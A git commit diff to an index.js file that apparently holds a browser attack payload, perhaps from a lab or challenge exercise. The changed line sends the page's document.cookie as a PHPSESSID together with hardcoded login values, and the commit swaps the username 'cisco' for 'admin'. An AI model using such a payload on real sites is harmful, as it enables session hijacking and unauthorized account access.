35f6b427341a97a7f3d8030d7a245564b3e93aa9
nastassiagoodson <60201494+nastassiagoodson@users.noreply.github.com>
2022-03-05 13:52:05 -0800

    Update index.js

--- index.js
+++ index.js
@@ -18,7 +18,7 @@
         const cook = document.cookie;
 
 
-        http.send("PHPSESSID="+cook+"&username=cisco&pin=123456&notRobot=on");
+        http.send("PHPSESSID="+cook+"&username=admin&pin=123456&notRobot=on");
 //     }
 // }
    
